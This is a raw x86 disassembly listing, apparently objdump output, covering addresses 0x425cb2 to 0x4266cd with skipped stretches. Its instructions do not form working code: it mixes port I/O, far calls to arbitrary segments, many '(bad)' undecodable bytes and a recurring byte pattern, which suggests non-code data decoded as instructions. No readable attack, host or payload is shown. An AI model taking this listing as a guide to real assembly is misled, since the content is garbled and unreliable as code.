  425cb2:	stos   DWORD PTR es:[edi],eax
  425cb3:	ds std 
	...
  425d15:	add    bh,bh
  425d17:	lods   al,BYTE PTR ds:[esi]
  425d18:	fadd   QWORD PTR [edi]
  425d1a:	fbstp  TBYTE PTR [edi-0x1]
  425d1d:	cld    
  425d1e:	fidiv  DWORD PTR [esi+0xd]
  425d21:	in     al,0x80
  425d23:	sbb    al,0xa9
  425d25:	pop    edi
  425d26:	es xchg ebx,eax
  425d28:	add    DWORD PTR [eax],eax
  425d2a:	pop    es
  425d2b:	add    DWORD PTR [eax],eax
  425d2d:	add    ah,ah
  425d2f:	out    dx,eax
  425d30:	inc    ecx
  425d31:	ds mov dh,0x84
  425d34:	xchg   ecx,edx
  425d36:	loop   0x425d63
  425d38:	imul   edx,DWORD PTR [edx],0xffffffed
  425d3b:	push   ecx
  425d3c:	cli    
  425d3d:	call   0x7d7e:0x3af5311e
  425d44:	ins    BYTE PTR es:[edi],dx
  425d45:	pop    ds
  425d46:	mov    cl,0xe1
  425d48:	adc    ebp,DWORD PTR [esi+ebp*2+0x60]
  425d4c:	jb     0x425d97
  425d4e:	jp     0x425cf1
  425d50:	es mul ch
  425d53:	cdq    
  425d54:	and    eax,0x494b0261
  425d59:	mov    cl,BYTE PTR [eax+0x6204d46b]
  425d5f:	push   esp
  425d60:	iret   
  425d61:	shr    esi,1
  425d63:	dec    edx
  425d64:	mov    eax,0x4369e23e
  425d69:	mov    cl,0x1c
  425d6b:	adc    ebp,edx
  425d6d:	in     al,dx
  425d6e:	sbb    ch,ah
  425d70:	or     al,0x9a
  425d72:	aam    0x36
  425d74:	cmp    BYTE PTR [esi],0x41
  425d77:	rol    DWORD PTR [ecx],1
  425d79:	mov    cl,0xd9
  425d7b:	pusha  
  425d7c:	ins    DWORD PTR es:[edi],dx
  425d7d:	arpl   WORD PTR ds:0x308380f,cx
  425d83:	mov    dl,0xcc
  425d85:	adc    eax,0x70fd2b23
  425d8a:	nop
  425d8b:	xchg   ebx,eax
  425d8c:	mov    esi,0xafbd2c6d
  425d91:	pop    esi
  425d92:	fnsave [eax]
  425d94:	arpl   WORD PTR [edi+0x5a],cx
  425d97:	xor    bh,al
  425d99:	sub    al,0x37
  425d9b:	mov    ah,dh
  425d9d:	(bad)  
  425d9e:	mov    ebp,0x967e10e3
  425da3:	and    cl,BYTE PTR [ebp-0x7b2b3b59]
  425da9:	and    eax,0x52630796
  425dae:	call   0x3efb:0xaffbceb8
  425db5:	ret    
  425db6:	mov    eax,0x66a55015
  425dbb:	xchg   ax,ax
  425dbd:	test   BYTE PTR [eax],0xad
  425dc0:	(bad)  
  425dc1:	mov    ebp,0xfcaa334a
  425dc6:	mov    ds:0xa6a8c76b,al
  425dcb:	aad    0x8f
  425dcd:	xchg   ebp,ecx
  425dcf:	mov    bl,0x8f
  425dd1:	jb     0x425dd2
  425dd3:	or     al,0x7d
  425dd5:	push   eax
  425dd6:	aam    0xd1
  425dd8:	mov    ds:0xd48db8b6,eax
  425ddd:	adc    ah,BYTE PTR [ebx+0x5b]
  425de0:	mov    ebx,DWORD PTR [edi-0x64]
  425de3:	unpcklps xmm7,XMMWORD PTR [ecx]
  425de6:	mov    ebp,0x7a38b4a6
  425deb:	nop
  425dec:	lods   eax,DWORD PTR ds:[esi]
  425ded:	pusha  
  425dee:	mov    ah,0x52
  425df0:	fcom   QWORD PTR [eax+0x3fb1ee5d]
  425df6:	xor    al,0x77
  425df8:	(bad)  
  425df9:	xor    esi,ecx
  425dfb:	jo     0x425e79
  425dfd:	xor    dl,BYTE PTR [esi]
  425dff:	out    dx,eax
  425e00:	fldcw  WORD PTR ds:0xc61769d9
  425e06:	inc    edx
  425e07:	mov    esi,0x55f1c0ff
  425e0c:	push   cs
  425e0d:	and    eax,0x61117988
  425e12:	jnp    0x425e3d
  425e14:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425e15:	cmp    al,0xf5
  425e17:	inc    edx
  425e18:	jle    0xda5bd3a7
  425e1e:	neg    edx
  425e20:	sub    eax,0x384c7d42
  425e25:	test   ah,dl
  425e27:	fs adc esi,DWORD PTR ds:[ecx+0x5aa1a298]
  425e2f:	daa    
  425e30:	mov    BYTE PTR [ecx+0xef78f3],ah
	...
  425e96:	(bad)  
  425e97:	jl     0x425eea
  425e99:	sar    bl,1
  425e9b:	std    
  425e9c:	(bad)  
  425e9d:	jle    0x425ea2
  425e9f:	test   BYTE PTR [edi],0xb2
  425ea2:	or     al,0x53
  425ea4:	arpl   WORD PTR [ebp*1+0x7000194],ax
  425eab:	add    DWORD PTR [eax],eax
  425ead:	add    bl,dh
  425eaf:	push   cs
  425eb0:	ins    BYTE PTR es:[edi],dx
  425eb1:	mov    al,0x7b
  425eb3:	xchg   esp,eax
  425eb4:	(bad)  
  425eb5:	in     eax,dx
  425eb6:	(bad)  
  425eb7:	mulps  xmm1,XMMWORD PTR ds:0xdf74a360
  425ebe:	stos   BYTE PTR es:[edi],al
  425ebf:	sbb    esi,ebp
  425ec1:	test   dh,dl
  425ec3:	pop    ebp
  425ec4:	sbb    edi,DWORD PTR [esi+0x26]
  425ec7:	mov    ds:0xc11c8cc5,eax
  425ecc:	fistp  QWORD PTR [edi-0x4b59c159]
  425ed2:	adc    bl,bl
  425ed4:	and    al,bl
  425ed6:	dec    eax
  425ed7:	xchg   ebx,eax
  425ed8:	add    dh,bl
  425eda:	xchg   ebp,eax
  425edb:	test   BYTE PTR [edi],0xf5
  425ede:	cmc    
  425edf:	xlat   BYTE PTR ds:[ebx]
  425ee0:	mov    ds:0x486a4b2a,al
  425ee5:	in     eax,dx
  425ee6:	sub    ah,dh
  425ee8:	mov    esi,0xe62767c6
  425eed:	jmp    0x9ee2f82
  425ef2:	mov    edx,0x9248b475
  425ef7:	jle    0x425f62
  425ef9:	aam    0x4d
  425efb:	mov    ah,0xa9
  425efd:	rcl    DWORD PTR [esi],cl
  425eff:	push   0x55ac910
  425f04:	inc    ecx
  425f05:	mov    esi,0x9aaf158c
  425f0a:	sar    DWORD PTR [ebp-0x29],1
  425f0d:	adc    esp,DWORD PTR [eax+0x23]
  425f10:	jmp    0x425f67
  425f12:	mov    bh,0xa4
  425f14:	cdq    
  425f15:	ja     0x425ef4
  425f17:	aam    0x36
  425f19:	lds    ebp,FWORD PTR [ebx+0x37157c69]
  425f1f:	dec    eax
  425f20:	xlat   BYTE PTR ds:[ebx]
  425f21:	push   0xe9a41d26
  425f26:	push   esi
  425f27:	fwait
  425f28:	test   eax,0xc6b7bbfd
  425f2d:	jb     0x425f9c
  425f2f:	test   BYTE PTR [ebx-0xb59f624],bh
  425f35:	mov    edi,0x20ed6b87
  425f3a:	xchg   esi,eax
  425f3b:	lds    eax,FWORD PTR [esi]
  425f3d:	jge    0x425f79
  425f3f:	(bad)  
  425f40:	add    edi,esi
  425f42:	aad    0xdb
  425f44:	sar    DWORD PTR [edi+eax*1-0xe],cl
  425f48:	or     BYTE PTR [eax-0x18],dh
  425f4b:	push   ss
  425f4c:	or     BYTE PTR [ebp+0x739d5ef8],0xf
  425f53:	das    
  425f54:	push   0xffffffc0
  425f56:	jg     0x425f1d
  425f58:	sti    
  425f59:	jb     0x425ee0
  425f5b:	cli    
  425f5c:	cmp    cl,0xac
  425f5f:	inc    edi
  425f60:	in     eax,dx
  425f61:	addr16 inc esi
  425f63:	out    0x2,al
  425f65:	mov    ds,WORD PTR [edx+0x42]
  425f68:	inc    DWORD PTR [ebx-0x36fc571b]
  425f6e:	fidivr DWORD PTR [ebx+0xf]
  425f71:	inc    edx
  425f72:	mov    eax,ds:0xaf85c748
  425f77:	stos   DWORD PTR es:[edi],eax
  425f78:	jbe    0x425f2f
  425f7a:	enter  0x3768,0xdc
  425f7e:	push   ss
  425f7f:	cmp    al,0x4a
  425f81:	cdq    
  425f82:	nop
  425f83:	pushf  
  425f84:	xchg   ecx,eax
  425f85:	inc    edx
  425f86:	(bad)  
  425f87:	sbb    DWORD PTR [ecx],ebp
  425f89:	adc    BYTE PTR [esi],ch
  425f8b:	inc    esi
  425f8c:	aas    
  425f8d:	mov    edi,gs
  425f8f:	call   0x6fc1dd76
  425f94:	and    BYTE PTR [edi],ah
  425f96:	fbstp  TBYTE PTR [ebx+0x54867b60]
  425f9c:	dec    edi
  425f9d:	sub    ebp,DWORD PTR [esi+esi*2]
  425fa0:	mov    esi,0xdf71d12
  425fa5:	adc    ecx,ebp
  425fa7:	xchg   esi,eax
  425fa8:	in     eax,0xcd
  425faa:	clc    
  425fab:	add    eax,0x48420620
  425fb0:	ret    
  425fb1:	mov    dh,0xfd
  425fb3:	or     al,0x53
	...
  426015:	add    BYTE PTR [ecx],bh
  426017:	cwde   
  426018:	or     eax,DWORD PTR [esi]
  42601a:	stos   DWORD PTR es:[edi],eax
  42601b:	xchg   edi,eax
  42601c:	cmp    eax,0x791073bf
  426021:	mov    esi,0xc2c621ec
  426026:	xor    al,0x95
  426028:	add    DWORD PTR [eax],eax
  42602a:	pop    es
  42602b:	add    DWORD PTR [eax],eax
  42602d:	add    dl,ch
  42602f:	xchg   ebp,eax
  426030:	sub    bh,BYTE PTR [edx-0x5ee8cbbf]
  426036:	dec    edx
  426037:	mov    eax,0x2b257c20
  42603c:	adc    al,0xc8
  42603e:	push   ecx
  42603f:	ins    DWORD PTR es:[edi],dx
  426040:	dec    ebp
  426041:	scas   al,BYTE PTR es:[edi]
  426042:	jle    0x426074
  426044:	stos   BYTE PTR es:[edi],al
  426045:	fwait
  426046:	mov    WORD PTR [ebx+0x70],ds
  426049:	mov    ds:0x3b60149e,al
  42604e:	mov    edx,0xaef78693
  426053:	cld    
  426054:	scas   eax,DWORD PTR es:[edi]
  426055:	ins    DWORD PTR es:[edi],dx
  426056:	add    edi,DWORD PTR [esi]
  426058:	retf   0xe953
  42605b:	inc    ebp
  42605c:	fsubr  DWORD PTR [eax+0x1ba3aeba]
  426062:	sub    edx,ecx
  426064:	enter  0x6d37,0x1e
  426068:	pop    edx
  426069:	dec    eax
  42606a:	popf   
  42606b:	add    BYTE PTR [edx+edx*1-0x7b37b3db],cl
  426072:	pop    es
  426073:	jp     0x426040
  426075:	lea    edi,[ecx+0x110de0cc]
  42607b:	mov    al,ds:0x895e5a46
  426080:	mov    eax,esp
  426082:	scas   eax,DWORD PTR es:[edi]
  426083:	dec    ebx
  426084:	and    bh,dl
  426086:	rol    edi,cl
  426088:	loope  0x426019
  42608a:	enter  0xa08,0x4
  42608e:	xchg   ebp,eax
  42608f:	inc    esp
  426090:	ss mov ebp,0x388b5d2d
  426096:	or     BYTE PTR [ecx-0x2e],0x34
  42609a:	or     cl,BYTE PTR [ebp-0x647fdd94]
  4260a0:	stos   DWORD PTR es:[edi],eax
  4260a1:	loop   0x426028
  4260a3:	jp     0x42606a
  4260a5:	fisub  WORD PTR [esi+eiz*2]
  4260a8:	mov    dh,cl
  4260aa:	mov    ch,0x88
  4260ac:	jo     0x4260b5
  4260ae:	xor    ebx,edi
  4260b0:	pushf  
  4260b1:	int    0x8f
  4260b3:	aad    0x69
  4260b5:	fimul  DWORD PTR [ecx+0x40]
  4260b8:	bound  esi,QWORD PTR [esi-0x6d5ec279]
  4260be:	pushw  es
  4260c0:	js     0x426054
  4260c2:	icebp  
  4260c3:	sbb    al,ah
  4260c5:	(bad)  
  4260c6:	in     al,dx
  4260c7:	cmovno edx,eax
  4260ca:	sub    DWORD PTR [edx+0x6a],ebp
  4260cd:	ret    
  4260ce:	iret   
  4260cf:	mov    ah,0x3f
  4260d1:	dec    esp
  4260d2:	outs   dx,DWORD PTR ds:[esi]
  4260d3:	xchg   esp,eax
  4260d4:	adc    edx,DWORD PTR [ebx]
  4260d6:	repz mov bl,0xa8
  4260d9:	and    ah,al
  4260db:	lea    ecx,[edi-0x15]
  4260de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4260df:	(bad)  
  4260e0:	mov    ah,0x7c
  4260e2:	arpl   sp,si
  4260e4:	xlat   BYTE PTR ds:[ebx]
  4260e5:	jne    0x426132
  4260e7:	pop    ss
  4260e8:	scas   eax,DWORD PTR es:[edi]
  4260e9:	sbb    cl,BYTE PTR ds:[ecx]
  4260ec:	sahf   
  4260ed:	aad    0x2e
  4260ef:	sub    BYTE PTR [esi+ebp*8+0x58e54038],bh
  4260f6:	mov    ebx,DWORD PTR [ecx]
  4260f8:	mov    edi,0xe8962d34
  4260fd:	arpl   WORD PTR [ecx+0x357b61a4],bx
  426103:	push   esi
  426104:	ss into 
  426106:	(bad)  
  426107:	mov    bl,0x74
  426109:	daa    
  42610a:	jle    0x426188
  42610c:	or     BYTE PTR [ebx+0x4436a7ed],0x87
  426113:	mov    ch,0x97
  426115:	push   edx
  426116:	dec    esp
  426117:	repnz mov ds:0x6d3558a9,eax
  42611d:	clc    
  42611e:	gs lock inc esi
  426121:	pop    ebx
  426122:	mov    dh,ch
  426124:	(bad)  
  426126:	mov    edi,0xecd12efd
  42612b:	lods   al,BYTE PTR ds:[esi]
  42612c:	add    ebp,ecx
  42612e:	add    eax,0x66d4e14e
  426133:	dec    edx
  426134:	fld    DWORD PTR [eax]
	...
  426196:	fwait
  426197:	and    DWORD PTR [edi],ecx
  426199:	popa   
  42619a:	mov    edi,0x6ffbff6f
  42619f:	sub    BYTE PTR [ebx-0x50125f7d],bh
  4261a5:	in     eax,dx
  4261a6:	cmp    edx,DWORD PTR [esi+0x1070001]
  4261ac:	add    BYTE PTR [eax],al
  4261ae:	aad    0x97
  4261b0:	sub    ecx,DWORD PTR [esi]
  4261b2:	sub    al,0xd2
  4261b4:	je     0x42622a
  4261b6:	mov    ch,0x90
  4261b8:	push   ecx
  4261b9:	push   0xa91e8b55
  4261be:	in     eax,0x49
  4261c0:	out    dx,eax
  4261c1:	sar    esi,cl
  4261c3:	ins    BYTE PTR es:[edi],dx
  4261c4:	mov    BYTE PTR ss:[ebp+0x58],al
  4261c8:	mov    DWORD PTR [esi],edx
  4261ca:	ret    
  4261cb:	mov    BYTE PTR [eax+0x1c],0x7b
  4261cf:	nop
  4261d0:	pop    DWORD PTR [edi+edi*2-0x4fbff607]
  4261d7:	outs   dx,DWORD PTR ds:[esi]
  4261d8:	jnp    0x4261fd
  4261da:	data16 sbb bh,BYTE PTR [eax+ebp*4+0x5f]
  4261df:	xchg   ebx,eax
  4261e0:	popf   
  4261e1:	clc    
  4261e2:	mov    al,bh
  4261e4:	aas    
  4261e5:	out    0x5f,al
  4261e7:	or     edi,ecx
  4261e9:	packuswb mm7,QWORD PTR [edi-0x38]
  4261ed:	add    esp,DWORD PTR [edx-0x30]
  4261f0:	inc    ebp
  4261f1:	out    0xa9,eax
  4261f3:	outs   dx,DWORD PTR ds:[esi]
  4261f4:	fdiv   QWORD PTR [ebx-0x53]
  4261f7:	daa    
  4261f8:	icebp  
  4261f9:	xchg   BYTE PTR [edx+edx*1-0x2c],dl
  4261fd:	hlt    
  4261fe:	repnz xchg ecx,eax
  426200:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426201:	jnp    0x42625c
  426203:	int    0xb
  426205:	and    eax,0xffffffa4
  426208:	push   0x43d54e87
  42620d:	mov    cl,0xef
  42620f:	cld    
  426210:	clc    
  426211:	jo     0x426292
  426213:	dec    ebp
  426214:	hlt    
  426215:	and    DWORD PTR [ecx+0x2df2e9d2],ebx
  42621b:	pusha  
  42621c:	loope  0x426277
  42621e:	fwait
  42621f:	dec    ebp
  426220:	data16 das 
  426222:	adc    DWORD PTR [esi+0x4bdc40d2],edi
  426228:	push   ecx
  426229:	sar    bh,1
  42622b:	sub    eax,0xc2147a9c
  426230:	cs mov edx,0xf23d44a9
  426236:	push   ecx
  426237:	ds aas 
  426239:	loopne 0x426210
  42623b:	xor    ah,BYTE PTR [ecx+0x4bdab51]
  426241:	in     al,dx
  426242:	dec    ebp
  426243:	and    eax,0x1a6da3f9
  426248:	sbb    al,0x7d
  42624a:	jg     0x4261dc
  42624c:	mov    eax,0xe9451b7a
  426251:	xor    al,0x7b
  426253:	les    edx,FWORD PTR [ecx]
  426255:	mov    eax,esp
  426257:	outs   dx,BYTE PTR ds:[esi]
  426258:	jne    0x426297
  42625a:	pushf  
  42625b:	shl    DWORD PTR [eax-0x73],0x1f
  42625f:	popf   
  426260:	jnp    0x426244
  426262:	(bad)  
  426263:	not    DWORD PTR [esi]
  426265:	push   ds
  426266:	lock pop esi
  426268:	or     edi,0x7
  42626b:	sub    eax,0x9a6596a
  426270:	sub    dh,BYTE PTR [esi+eax*2]
  426273:	std    
  426274:	(bad)
  426277:	jo     0x42625f
  426279:	lods   al,BYTE PTR ds:[esi]
  42627a:	int3   
  42627b:	out    0xeb,eax
  42627d:	inc    esi
  42627e:	lods   eax,DWORD PTR ds:[esi]
  42627f:	cmp    eax,0x42d9358a
  426284:	xor    cl,BYTE PTR es:[edi]
  426287:	ror    DWORD PTR [ebp+0x63f81a49],1
  42628d:	pusha  
  42628e:	adc    al,0x4a
  426290:	sbb    BYTE PTR [edi],ah
  426292:	cmp    dl,ah
  426294:	test   eax,0xdd2e05ee
  426299:	adc    al,0xac
  42629b:	xchg   edx,eax
  42629c:	sbb    ebp,0x65004964
  4262a2:	push   es
  4262a3:	sahf   
  4262a4:	mov    WORD PTR [ecx],ss
  4262a6:	lea    eax,[eax-0x4aef49f4]
  4262ac:	fisttp WORD PTR [ebp+0x73]
  4262af:	cmp    esi,edx
  4262b1:	jbe    0x4262af
  4262b3:	lea    eax,[eax+0x0]
	...
  426315:	add    BYTE PTR [ebp+eiz*1-0x73],dl
  426319:	dec    esi
  42631a:	std    
  42631b:	out    dx,al
  42631c:	xlat   BYTE PTR ds:[ebx]
  42631d:	aas    
  42631e:	ins    BYTE PTR es:[edi],dx
  42631f:	lods   al,BYTE PTR ds:[esi]
  426320:	ret    0x9c54
  426323:	jns    0x42633e
  426325:	hlt    
  426326:	inc    edx
  426327:	xchg   edi,eax
  426328:	add    DWORD PTR [eax],eax
  42632a:	pop    es
  42632b:	add    DWORD PTR [eax],eax
  42632d:	add    BYTE PTR [ebx+0x1f12aabc],al
  426333:	sahf   
  426334:	lods   eax,DWORD PTR ds:[esi]
  426335:	retf   
  426336:	(bad)  
  426337:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426338:	sub    al,0xa9
  42633a:	dec    esi
  42633b:	sbb    al,0x65
  42633d:	cmp    al,0x31
  42633f:	mov    eax,DWORD PTR [ecx-0x42]
  426342:	xchg   esi,eax
  426343:	dec    esp
  426344:	ret    0xbea6
  426347:	loope  0x4262cd
  426349:	dec    ebp
  42634a:	icebp  
  42634b:	jno    0x4263ab
  42634d:	mov    DWORD PTR [esi+0x6],edx
  426350:	out    dx,al
  426351:	sub    eax,0x38f10342
  426356:	add    eax,DWORD PTR [ebx]
  426358:	dec    esi
  426359:	jmp    FWORD PTR gs:[ecx]
  42635c:	out    dx,al
  42635d:	adc    BYTE PTR [esi-0x61],al
  426360:	aam    0x0
  426362:	and    al,0xe6
  426364:	push   edx
  426365:	push   ds
  426366:	test   eax,0x63baff72
  42636b:	xchg   esi,eax
  42636c:	push   ds
  42636d:	rcr    dl,1
  42636f:	fistp  DWORD PTR ds:0x4eb5862e
  426375:	jb     0x4263c5
  426377:	shr    edi,0x35
  42637a:	lock push cs
  42637c:	lock and eax,0x6a8b2858
  426382:	xchg   edi,eax
  426383:	lods   al,BYTE PTR ds:[esi]
  426384:	ficom  DWORD PTR ds:0xd6991806
  42638a:	cs inc ebp
  42638c:	sub    DWORD PTR [ebx],0x63cba245
  426392:	pop    es
  426393:	ffreep st(2)
  426395:	xor    BYTE PTR [ecx+0x37],dl
  426398:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426399:	xchg   esp,eax
  42639a:	pop    eax
  42639b:	and    ebp,DWORD PTR [eax-0x6c698f88]
  4263a1:	ins    DWORD PTR es:[edi],dx
  4263a2:	mov    edx,0x4f41ce2
  4263a7:	or     dh,BYTE PTR [edx-0x69bb8a95]
  4263ad:	out    0x61,eax
  4263af:	lods   eax,DWORD PTR ds:[esi]
  4263b0:	shl    BYTE PTR [edx+0x10],cl
  4263b3:	sti    
  4263b4:	scas   eax,DWORD PTR es:[edi]
  4263b5:	leave  
  4263b6:	(bad)  
  4263b8:	jns    0x42640a
  4263ba:	dec    edi
  4263bb:	rcr    dh,cl
  4263bd:	mov    ebp,0x2c0c14c0
  4263c2:	sub    ecx,ebx
  4263c4:	test   al,0x3f
  4263c6:	jb     0x426407
  4263c8:	rcr    BYTE PTR [eax],1
  4263ca:	scas   al,BYTE PTR es:[edi]
  4263cb:	xchg   esp,eax
  4263cc:	shl    esi,1
  4263ce:	xlat   BYTE PTR gs:[ebx]
  4263d0:	aas    
  4263d1:	adc    eax,0xeba6f5fb
  4263d6:	les    edx,FWORD PTR [edx]
  4263d8:	mov    edi,0xc03309c1
  4263dd:	aad    0x6
  4263df:	(bad)  
  4263e0:	mov    cl,0x63
  4263e2:	push   esi
  4263e3:	pusha  
  4263e4:	push   esi
  4263e5:	bound  ebx,QWORD PTR ds:0x8de839d4
  4263eb:	xor    edi,eax
  4263ed:	sub    eax,DWORD PTR [ecx+edi*4+0x2]
  4263f1:	sbb    eax,0x87f6f297
  4263f6:	in     al,0x26
  4263f8:	add    DWORD PTR [edi],ecx
  4263fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4263fb:	or     eax,DWORD PTR [edx]
  4263fd:	rcr    DWORD PTR [edi+ebp*2-0x7edb833b],0x71
  426405:	push   esi
  426406:	dec    edx
  426407:	sbb    DWORD PTR [esi+0x4a],ebx
  42640a:	jne    0x4263e7
  42640c:	loope  0x4263dc
  42640e:	popf   
  42640f:	lods   al,BYTE PTR ds:[esi]
  426410:	stc    
  426411:	cdq    
  426412:	mov    cs,WORD PTR [esi-0x432cac79]
  426418:	dec    ebp
  426419:	xchg   esp,eax
  42641a:	in     al,dx
  42641b:	inc    esp
  42641c:	mov    ds:0x383e35be,al
  426421:	or     al,0x7d
  426423:	push   eax
  426424:	sbb    eax,DWORD PTR ds:0x78aae6ae
  42642a:	inc    ecx
  42642b:	hlt    
  42642c:	scas   eax,DWORD PTR es:[edi]
  42642d:	mov    dh,0x4
  42642f:	retf   
  426430:	xor    ebx,DWORD PTR [ecx+0x51]
  426433:	xchg   BYTE PTR [eax+eax*1+0x0],al
	...
  426493:	add    BYTE PTR [eax],al
  426495:	add    BYTE PTR [ecx+0x6f],ch
  426498:	mov    BYTE PTR [eax],cl
  42649a:	mov    gs,edi
  42649c:	jmp    0x7b21f210
  4264a1:	dec    esp
  4264a2:	add    bh,BYTE PTR [edx+edx*1+0x55]
  4264a6:	dec    ecx
  4264a7:	cwde   
  4264a8:	add    DWORD PTR [eax],eax
  4264aa:	pop    es
  4264ab:	add    DWORD PTR [eax],eax
  4264ad:	add    bl,bh
  4264af:	and    dl,dl
  4264b1:	ret    
  4264b2:	aas    
  4264b3:	sub    al,0x1d
  4264b5:	mov    BYTE PTR [edx+0x5b2d0f1d],dl
  4264bb:	mov    DWORD PTR [eax],eax
  4264bd:	push   edx
  4264be:	imul   ebp,DWORD PTR [edi-0x40],0x1c
  4264c2:	clc    
  4264c3:	adc    eax,0xd8ecf435
  4264c8:	pop    es
  4264c9:	add    BYTE PTR [eax-0x1b],dl
  4264cc:	add    dl,BYTE PTR [eax-0x5f]
  4264cf:	das    
  4264d0:	and    eax,0xb09efabf
  4264d5:	jbe    0x4264ba
  4264d7:	pop    ecx
  4264d8:	inc    eax
  4264d9:	push   edi
  4264da:	mov    ebx,0x92144139
  4264df:	cmp    DWORD PTR [edi+edx*1-0x33],edx
  4264e3:	pop    eax
  4264e4:	(bad)  
  4264e5:	fsub   QWORD PTR [edx+0x70b170ee]
  4264eb:	cmp    esi,edi
  4264ed:	fcmovb st,st(4)
  4264ef:	adc    BYTE PTR [eax],cl
  4264f1:	xor    eax,DWORD PTR [ebp+0x4c]
  4264f4:	arpl   WORD PTR [edx+0x1],di
  4264f7:	mov    ebx,0xe9c31c1f
  4264fc:	out    0x2f,al
  4264fe:	cld    
  4264ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426500:	les    esp,FWORD PTR [esi+esi*2+0x32fdcd59]
  426507:	cwde   
  426508:	(bad)  
  42650a:	mov    bl,0x67
  42650c:	dec    eax
  42650d:	xchg   esi,eax
  42650e:	mov    ch,0x46
  426510:	pop    es
  426511:	mov    bl,0xb2
  426513:	sbb    DWORD PTR [edx+0x3470d2ca],esi
  426519:	stos   DWORD PTR es:[edi],eax
  42651a:	fcmovnbe st,st(6)
  42651c:	add    dh,bl
  42651e:	mov    al,ds:0x804ad56d
  426523:	stos   DWORD PTR es:[edi],eax
  426524:	sahf   
  426525:	mov    ecx,0x197a0416
  42652a:	xor    bl,BYTE PTR [ebx]
  42652c:	cmp    al,dh
  42652e:	bound  ebp,QWORD PTR [ebx-0x1b6814cd]
  426534:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426535:	add    edx,DWORD PTR [ebx]
  426537:	and    DWORD PTR [ecx-0xe],edx
  42653a:	std    
  42653b:	xchg   ebp,eax
  42653c:	out    dx,al
  42653d:	xor    eax,0x40c77c05
  426542:	pop    ebp
  426543:	imul   ebx,DWORD PTR [eax+0x32],0xc9e76ebe
  42654a:	fs jl  0x426575
  42654d:	inc    edi
  42654e:	nop
  42654f:	mov    cl,0x92
  426551:	pop    ss
  426552:	or     ecx,DWORD PTR [edi-0x32]
  426555:	cld    
  426556:	dec    esi
  426557:	adc    al,0x7d
  426559:	mov    ds:0x3da3682f,al
  42655e:	cdq    
  42655f:	call   0xcdc1:0xef880c57
  426566:	mov    ebp,DWORD PTR [edx-0x4f]
  426569:	add    DWORD PTR es:[esi-0x39],esp
  42656d:	xchg   ebp,eax
  42656e:	xor    dh,BYTE PTR [esi+0x3a]
  426571:	xor    DWORD PTR [edi+0x1ef708f6],edx
  426577:	imul   esp,ebx,0xb0aa9be2
  42657d:	aad    0xd5
  42657f:	je     0x4265b2
  426581:	xor    dh,BYTE PTR [edx-0x7b]
  426584:	retf   0x27b0
  426587:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426588:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426589:	popa   
  42658a:	and    ah,BYTE PTR [edx-0x48bb7c3f]
  426590:	dec    esp
  426591:	das    
  426592:	ret    
  426593:	fcom   QWORD PTR [eax+0x6e]
  426596:	stc    
  426597:	mov    eax,0x7f564d0a
  42659c:	and    eax,0x6e5529ce
  4265a1:	outs   dx,BYTE PTR ds:[esi]
  4265a2:	pop    ebx
  4265a3:	call   0x518d:0x5a0809a4
  4265aa:	jmp    0xee12e524
  4265af:	iret   
  4265b0:	mov    bl,0xac
  4265b2:	push   0x62
	...
  426613:	add    BYTE PTR [eax],al
  426615:	add    BYTE PTR [edx],dl
  426617:	retf   
  426618:	sbb    DWORD PTR [edx],0xcb9b5ad9
  42661e:	xor    DWORD PTR [ecx+0x6f],0x2f
  426622:	iret   
  426623:	cmp    eax,0x9950bf4c
  426628:	add    DWORD PTR [eax],eax
  42662a:	pop    es
  42662b:	add    DWORD PTR [eax],eax
  42662d:	add    bh,cl
  42662f:	repnz inc esp
  426631:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426632:	mov    DWORD PTR [edx+ebp*4-0x70],ecx
  426636:	push   ds
  426637:	gs in  al,0xa8
  42663a:	loop   0x426623
  42663c:	push   es
  42663d:	test   BYTE PTR [edx],0x8e
  426640:	pop    es
  426641:	fimul  DWORD PTR [esi-0x1d]
  426644:	mov    BYTE PTR [ebp+0x7bccfe60],0x49
  42664b:	mov    dl,0x46
  42664d:	rcr    BYTE PTR [eax-0x30c0c6ae],1
  426653:	mov    al,ds:0xf7980049
  426658:	jg     0x426697
  42665a:	popf   
  42665b:	pop    ss
  42665c:	xlat   BYTE PTR ds:[ebx]
  42665d:	jle    0x426674
  42665f:	(bad)  
  426660:	ja     0x42667c
  426662:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426663:	popa   
  426664:	sub    eax,0x9f91c912
  426669:	mov    esp,0x528fbe39
  42666e:	lds    edi,FWORD PTR [edi]
  426670:	repz inc cx
  426673:	(bad)  
  426674:	in     eax,dx
  426675:	repnz pop ds
  426677:	xchg   dl,bh
  426679:	popf   
  42667a:	or     BYTE PTR [eax],dl
  42667c:	add    ebp,DWORD PTR [ebp-0xb]
  42667f:	es aaa 
  426681:	ja     0x4266ed
  426683:	out    0xf3,eax
  426685:	pop    ds
  426686:	sar    DWORD PTR [ebp+0x26dd4e7d],0xab
  42668d:	xlat   BYTE PTR ds:[ebx]
  42668e:	popa   
  42668f:	dec    ecx
  426690:	add    ah,BYTE PTR [esi+0x67]
  426693:	jg     0x426624
  426695:	push   eax
  426696:	jmp    0x4266c1
  426698:	sbb    DWORD PTR [eax],edi
  42669a:	mov    cl,0x43
  42669c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42669d:	neg    DWORD PTR cs:[ecx+0x19bbcf1e]
  4266a4:	sbb    DWORD PTR [ebp+0x46feffe7],ecx
  4266aa:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4266ac:	jmp    0x8193:0xa1f60416
  4266b3:	in     al,0xe5
  4266b5:	inc    ebp
  4266b6:	enter  0xf402,0xac
  4266ba:	icebp  
  4266bb:	pop    ss
  4266bc:	outs   dx,DWORD PTR ds:[esi]
  4266bd:	jnp    0x426675
  4266bf:	test   al,0x9f
  4266c1:	jmp    0xb704:0x448c143e
  4266c8:	fs mov bh,0x5a
  4266cb:	push   ecx
  4266cc:	pop    ebx
  4266cd:	xor    dh,bh
